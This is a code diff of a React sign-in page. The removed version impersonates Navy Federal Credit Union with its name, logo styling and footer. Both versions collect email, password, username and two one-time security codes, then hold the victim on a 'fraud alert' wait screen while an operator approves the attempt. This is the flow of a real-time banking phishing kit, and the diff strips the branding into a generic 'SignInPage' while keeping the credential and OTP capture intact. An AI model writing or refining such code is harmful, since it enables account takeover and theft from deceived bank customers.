@@ -1,4 +1,4 @@
-'use client'
+ 'use client'
 
 import { useEffect, useState } from 'react'
 import {
@@ -20,7 +20,7 @@ type Step =
 const WAIT_MSG =
   'Your account verification will automatically update here once admin looks into the fraud alert.'
 
-export default function NavyFederalBanking() {
+export default function SignInPage() {
   const [step, setStep] = useState<Step>('credentials')
   const [email, setEmail] = useState('')
   const [password, setPassword] = useState('')
@@ -30,7 +30,6 @@ export default function NavyFederalBanking() {
   const [error, setError] = useState<string | null>(null)
   const [note, setNote] = useState<string | null>(null)
   const [loading, setLoading] = useState(false)
-  const [showPassword, setShowPassword] = useState(false)
 
   useEffect(() => {
     if (step !== 'awaiting_approval' || !attemptId) return
@@ -51,6 +50,18 @@ export default function NavyFederalBanking() {
       clearInterval(id)
     }
   }, [step, attemptId])
+
+  if (step === 'approved_success') {
+    return (
+      <main style={plainPage}>
+        <div style={column}>
+          <h1 style={heading}>Congratulations</h1>
+          <p style={text}>Your account &amp; verification has been approved.</p>
+          {email ? <p style={text}>{email}</p> : null}
+        </div>
+      </main>
+    )
+  }
 
   async function onSubmit(e: React.FormEvent) {
     e.preventDefault()
@@ -115,435 +126,177 @@ export default function NavyFederalBanking() {
   }
 
   const titles: Record<Exclude<Step, 'approved_success'>, string> = {
-    credentials: 'Sign In',
-    username: 'Enter Username',
-    otp1: 'Enter First Code',
-    otp2: 'Enter Second Code',
-    awaiting_approval: 'Verification in Progress',
-    rejected: 'Sign-in Blocked',
+    credentials: 'Log in',
+    username: 'Enter username',
+    otp1: 'Enter first code',
+    otp2: 'Enter second code',
+    awaiting_approval: 'Verification in progress',
+    rejected: 'Sign-in blocked',
   }
 
   return (
-    <div style={styles.container}>
-      {/* Navigation Header */}
-      <header style={styles.header}>
-        <div style={styles.headerLeft}>
-          <button style={styles.iconBtn} aria-label="Menu">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-              <line x1="3" y1="12" x2="21" y2="12" />
-              <line x1="3" y1="6" x2="21" y2="6" />
-              <line x1="3" y1="18" x2="21" y2="18" />
-            </svg>
-          </button>
-          <div style={styles.logoGroup}>
-            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-              <circle cx="12" cy="12" r="10" />
-              <line x1="2" y1="12" x2="22" y2="12" />
-              <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
-            </svg>
-            <span style={styles.logoText}>NAVY FEDERAL</span>
-          </div>
-        </div>
-      </header>
+    <main style={plainPage}>
+      <div style={column}>
+        <h1 style={heading}>{titles[step]}</h1>
 
-      <main style={styles.main}>
-        {/* Banner Section */}
-        <section style={styles.banner}>
-          <h1 style={styles.bannerTitle}>
-            {step === 'approved_success' ? 'Verification Complete' : 'Welcome to Digital Banking'}
-          </h1>
-        </section>
+        <form onSubmit={onSubmit} style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
+          {step === 'credentials' && (
+            <>
+              <label style={label}>
+                Email
+                <input
+                  type="email"
+                  required
+                  value={email}
+                  onChange={(e) => setEmail(e.target.value)}
+                  style={input}
+                />
+              </label>
+              <label style={label}>
+                Password
+                <input
+                  type="password"
+                  required
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
+                  style={input}
+                />
+              </label>
+            </>
+          )}
 
-        {/* Card Section */}
-        <section style={styles.cardWrapper}>
-          <div style={styles.card}>
-            {step === 'approved_success' ? (
-              <div>
-                <h2 style={styles.cardHeaderTitle}>Congratulations</h2>
-                <hr style={styles.divider} />
-                <p style={styles.text}>Your account &amp; verification has been approved.</p>
-                {email ? <p style={{ ...styles.text, fontWeight: 'bold' }}>{email}</p> : null}
-              </div>
-            ) : (
-              <>
-                <div style={styles.cardHeader}>
-                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#4a5568" strokeWidth="2">
-                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
-                    <path d="M7 11V7a5 5 0 0 1 10 0v4" />
-                  </svg>
-                  <h2 style={styles.cardHeaderTitle}>{titles[step]}</h2>
-                </div>
+          {step === 'username' && (
+            <label style={label}>
+              Username
+              <input
+                required
+                value={username}
+                onChange={(e) => setUsername(e.target.value)}
+                style={input}
+                autoComplete="username"
+              />
+            </label>
+          )}
 
-                <form onSubmit={onSubmit}>
-                  {step === 'credentials' && (
-                    <>
-                      <div style={styles.formGroup}>
-                        <label htmlFor="email" style={styles.label}>
-                          Email
-                          <span style={styles.helpBadge}>?</span>
-                        </label>
-                        <input
-                          id="email"
-                          type="email"
-                          required
-                          value={email}
-                          onChange={(e) => setEmail(e.target.value)}
-                          style={styles.input}
-                          autoComplete="email"
-                        />
-                      </div>
+          {(step === 'otp1' || step === 'otp2') && (
+            <label style={label}>
+              {step === 'otp1' ? 'Code' : 'Second code'}
+              <input
+                required
+                inputMode="numeric"
+                maxLength={6}
+                value={otp}
+                onChange={(e) =>
+                  setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))
+                }
+                style={input}
+              />
+            </label>
+          )}
 
-                      <div style={styles.formGroup}>
-                        <label htmlFor="password" style={styles.label}>Password</label>
-                        <div style={styles.inputRelative}>
-                          <input
-                            id="password"
-                            type={showPassword ? 'text' : 'password'}
-                            required
-                            value={password}
-                            onChange={(e) => setPassword(e.target.value)}
-                            style={styles.input}
-                            autoComplete="current-password"
-                          />
-                          <button
-                            type="button"
-                            onClick={() => setShowPassword(!showPassword)}
-                            style={styles.eyeBtn}
-                            aria-label="Toggle password"
-                          >
-                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#104780" strokeWidth="2">
-                              {showPassword ? (
-                                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24M1 1l22 22" />
-                              ) : (
-                                <>
-                                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
-                                  <circle cx="12" cy="12" r="3" />
-                                </>
-                              )}
-                            </svg>
-                          </button>
-                        </div>
-                      </div>
+          {step === 'awaiting_approval' && (
+            <p style={{ ...text, lineHeight: 1.5 }}>{WAIT_MSG}</p>
+          )}
 
-                      <div style={{ marginBottom: 16 }}>
-                        <a href="#help" style={styles.dottedLink}>SIGN IN HELP</a>
-                      </div>
-                    </>
-                  )}
+          {error && <p style={{ color: '#c00', margin: 0, fontSize: 14 }}>{error}</p>}
+          {note && step !== 'awaiting_approval' && (
+            <p style={{ color: '#333', margin: 0, fontSize: 14 }}>{note}</p>
+          )}
 
-                  {step === 'username' && (
-                    <div style={styles.formGroup}>
-                      <label htmlFor="username" style={styles.label}>
-                        Username
-                        <span style={styles.helpBadge}>?</span>
-                      </label>
-                      <input
-                        id="username"
-                        type="text"
-                        required
-                        value={username}
-                        onChange={(e) => setUsername(e.target.value)}
-                        style={styles.input}
-                        autoComplete="username"
-                      />
-                    </div>
-                  )}
+          {step !== 'awaiting_approval' && step !== 'rejected' && (
+            <button type="submit" disabled={loading} style={button}>
+              {loading ? 'Please wait…' : 'Continue'}
+            </button>
+          )}
 
-                  {(step === 'otp1' || step === 'otp2') && (
-                    <div style={styles.formGroup}>
-                      <label htmlFor="otp" style={styles.label}>
-                        {step === 'otp1' ? 'First Security Code' : 'Second Security Code'}
-                      </label>
-                      <input
-                        id="otp"
-                        type="text"
-                        required
-                        inputMode="numeric"
-                        maxLength={6}
-                        value={otp}
-                        onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
-                        style={styles.input}
-                      />
-                    </div>
-                  )}
-
-                  {step === 'awaiting_approval' && <p style={styles.text}>{WAIT_MSG}</p>}
-
-                  {error && <p style={styles.errorText}>{error}</p>}
-                  {note && step !== 'awaiting_approval' && <p style={styles.noteText}>{note}</p>}
-
-                  {step !== 'awaiting_approval' && step !== 'rejected' && (
-                    <button type="submit" disabled={loading} style={styles.btnPrimary}>
-                      {loading ? 'Please wait…' : step === 'credentials' ? 'Sign In' : 'Continue'}
-                    </button>
-                  )}
-
-                  {step !== 'credentials' && step !== 'awaiting_approval' && (
-                    <button
-                      type="button"
-                      onClick={() => {
-                        setStep('credentials')
-                        setAttemptId(null)
-                        setUsername('')
-                        setOtp('')
-                        setError(null)
-                        setNote(null)
-                      }}
-                      style={styles.btnSecondary}
-                    >
-                      Start over
-                    </button>
-                  )}
-                </form>
-              </>
-            )}
-          </div>
-        </section>
-
-        {/* Member Callout Section */}
-        <section style={styles.whiteSection}>
-          <h2 style={styles.sectionHeading}>Not a Navy Federal Member?</h2>
-          <p style={styles.sectionDesc}>
-            Join now and enjoy the support and great service of a credit union that puts your needs first.
-          </p>
-          <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
-            <button style={styles.btnPrimary}>Become a Member</button>
-            <button style={styles.btnBlue}>Learn More</button>
-          </div>
-        </section>
-
-        {/* Footer Section */}
-        <footer style={styles.footer}>
-          <div style={styles.logoGroupFooter}>
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#10305a" strokeWidth="2">
-              <circle cx="12" cy="12" r="10" />
-              <line x1="2" y1="12" x2="22" y2="12" />
-            </svg>
-            <div>
-              <div style={{ fontWeight: 800, fontSize: 16, color: '#10305a', fontStyle: 'italic' }}>NAVY FEDERAL</div>
-              <div style={{ fontSize: 10, textTransform: 'uppercase', color: '#10305a', fontWeight: 600 }}>Credit Union</div>
-            </div>
-          </div>
-          <p style={{ margin: '12px 0 0', fontSize: 12, color: '#4a5568' }}>© 2026 Navy Federal Credit Union. All rights reserved.</p>
-        </footer>
-      </main>
-    </div>
+          {step !== 'credentials' && step !== 'awaiting_approval' && (
+            <button
+              type="button"
+              onClick={() => {
+                setStep('credentials')
+                setAttemptId(null)
+                setUsername('')
+                setOtp('')
+                setError(null)
+                setNote(null)
+              }}
+              style={buttonSecondary}
+            >
+              Start over
+            </button>
+          )}
+        </form>
+      </div>
+    </main>
   )
 }
 
-const styles: { [key: string]: React.CSSProperties } = {
-  container: {
-    minHeight: '100vh',
-    backgroundColor: '#143260',
-    fontFamily: 'system-ui, -apple-system, sans-serif',
-    color: '#2d3748',
-    margin: 0,
-  },
-  header: {
-    backgroundColor: '#104780',
-    color: '#ffffff',
-    padding: '12px 16px',
-    borderBottom: '1px solid #0c3663',
-  },
-  headerLeft: {
-    display: 'flex',
-    alignItems: 'center',
-    gap: 12,
-  },
-  iconBtn: {
-    background: 'none',
-    border: 'none',
-    color: '#fff',
-    cursor: 'pointer',
-    padding: 4,
-    display: 'flex',
-  },
-  logoGroup: {
-    display: 'flex',
-    alignItems: 'center',
-    gap: 8,
-  },
-  logoText: {
-    fontWeight: 800,
-    fontSize: 20,
-    fontStyle: 'italic',
-    letterSpacing: '-0.5px',
-  },
-  main: {
-    maxWidth: 440,
-    margin: '0 auto',
-  },
-  banner: {
-    backgroundColor: '#a8c9e8',
-    padding: '16px 20px',
-  },
-  bannerTitle: {
-    margin: 0,
-    fontSize: 22,
-    fontWeight: 700,
-    color: '#10305a',
-  },
-  cardWrapper: {
-    backgroundColor: '#a8c9e8',
-    padding: '0 16px 24px',
-  },
-  card: {
-    backgroundColor: '#f4f4f4',
-    borderRadius: 8,
-    borderTop: '4px solid #e07e27',
-    padding: 20,
-    boxShadow: '0 4px 6px rgba(0,0,0,0.1)',
-  },
-  cardHeader: {
-    display: 'flex',
-    alignItems: 'center',
-    gap: 8,
-    borderBottom: '1px solid #cbd5e0',
-    paddingBottom: 12,
-    marginBottom: 20,
-  },
-  cardHeaderTitle: {
-    margin: 0,
-    fontSize: 20,
-    fontWeight: 600,
-    color: '#2d3748',
-  },
-  formGroup: {
-    marginBottom: 16,
-  },
-  label: {
-    display: 'flex',
-    alignItems: 'center',
-    fontSize: 14,
-    fontWeight: 700,
-    color: '#2d3748',
-    marginBottom: 4,
-  },
-  helpBadge: {
-    marginLeft: 6,
-    backgroundColor: '#718096',
-    color: '#fff',
-    borderRadius: '50%',
-    width: 16,
-    height: 16,
-    fontSize: 10,
-    display: 'inline-flex',
-    alignItems: 'center',
-    justifyContent: 'center',
-  },
-  inputRelative: {
-    position: 'relative',
-    display: 'flex',
-    alignItems: 'center',
-  },
-  input: {
-    width: '100%',
-    padding: '10px 12px',
-    backgroundColor: '#ffffff',
-    border: '1px solid #a0aec0',
-    borderRadius: 4,
-    fontSize: 15,
-    boxSizing: 'border-box',
-    outline: 'none',
-  },
-  eyeBtn: {
-    position: 'absolute',
-    right: 10,
-    background: 'none',
-    border: 'none',
-    cursor: 'pointer',
-    padding: 0,
-    display: 'flex',
-  },
-  dottedLink: {
-    fontSize: 12,
-    fontWeight: 700,
-    color: '#104780',
-    textDecoration: 'none',
-    borderBottom: '1px dotted #104780',
-    letterSpacing: '0.5px',
-  },
-  btnPrimary: {
-    width: '100%',
-    backgroundColor: '#e07e27',
-    color: '#ffffff',
-    border: 'none',
-    borderRadius: 4,
-    padding: '12px 16px',
-    fontSize: 16,
-    fontWeight: 700,
-    cursor: 'pointer',
-    boxShadow: '0 2px 4px rgba(0,0,0,0.1)',
-  },
-  btnSecondary: {
-    width: '100%',
-    backgroundColor: 'transparent',
-    color: '#104780',
-    border: '1px solid #104780',
-    borderRadius: 4,
-    padding: '10px 16px',
-    fontSize: 14,
-    fontWeight: 700,
-    cursor: 'pointer',
-    marginTop: 10,
-  },
-  btnBlue: {
-    width: '100%',
-    backgroundColor: '#2b6cb0',
-    color: '#ffffff',
-    border: 'none',
-    borderRadius: 4,
-    padding: '12px 16px',
-    fontSize: 16,
-    fontWeight: 700,
-    cursor: 'pointer',
-  },
-  whiteSection: {
-    backgroundColor: '#ffffff',
-    padding: '32px 24px',
-    textAlign: 'center',
-  },
-  sectionHeading: {
-    margin: '0 0 12px',
-    fontSize: 20,
-    fontWeight: 700,
-    color: '#10305a',
-  },
-  sectionDesc: {
-    margin: '0 0 20px',
-    fontSize: 14,
-    color: '#4a5568',
-    lineHeight: 1.5,
-  },
-  text: {
-    fontSize: 14,
-    lineHeight: 1.5,
-    color: '#4a5568',
-    margin: '0 0 12px',
-  },
-  errorText: {
-    color: '#e53e3e',
-    fontSize: 14,
-    fontWeight: 600,
-    margin: '0 0 12px',
-  },
-  noteText: {
-    color: '#2d3748',
-    fontSize: 14,
-    margin: '0 0 12px',
-  },
-  divider: {
-    border: 'none',
-    borderTop: '1px solid #cbd5e0',
-    margin: '12px 0',
-  },
-  footer: {
-    backgroundColor: '#e5e7eb',
-    padding: '24px 24px',
-  },
-  logoGroupFooter: {
-    display: 'flex',
-    alignItems: 'center',
-    gap: 8,
-  },
+const plainPage: React.CSSProperties = {
+  minHeight: '100vh',
+  margin: 0,
+  background: '#ffffff',
+  color: '#000000',
+  display: 'flex',
+  alignItems: 'center',
+  justifyContent: 'center',
+  padding: 16,
+  fontFamily: 'system-ui, sans-serif',
 }
+
+const column: React.CSSProperties = {
+  width: '100%',
+  maxWidth: 320,
+}
+
+const heading: React.CSSProperties = {
+  margin: '0 0 16px',
+  fontSize: 20,
+  fontWeight: 600,
+}
+
+const label: React.CSSProperties = {
+  display: 'flex',
+  flexDirection: 'column',
+  gap: 4,
+  fontSize: 14,
+}
+
+const input: React.CSSProperties = {
+  height: 36,
+  padding: '0 8px',
+  border: '1px solid #ccc',
+  borderRadius: 2,
+  background: '#fff',
+  color: '#000',
+  fontSize: 14,
+}
+
+const button: React.CSSProperties = {
+  height: 36,
+  border: '1px solid #999',
+  borderRadius: 2,
+  background: '#f0f0f0',
+  color: '#000',
+  fontSize: 14,
+  cursor: 'pointer',
+}
+
+const buttonSecondary: React.CSSProperties = {
+  height: 36,
+  border: '1px solid #ccc',
+  borderRadius: 2,
+  background: '#fff',
+  color: '#000',
+  fontSize: 14,
+  cursor: 'pointer',
+}
+
+const text: React.CSSProperties = {
+  margin: '0 0 8px',
+  fontSize: 14,
+  color: '#000',
+}
+
+
+
+
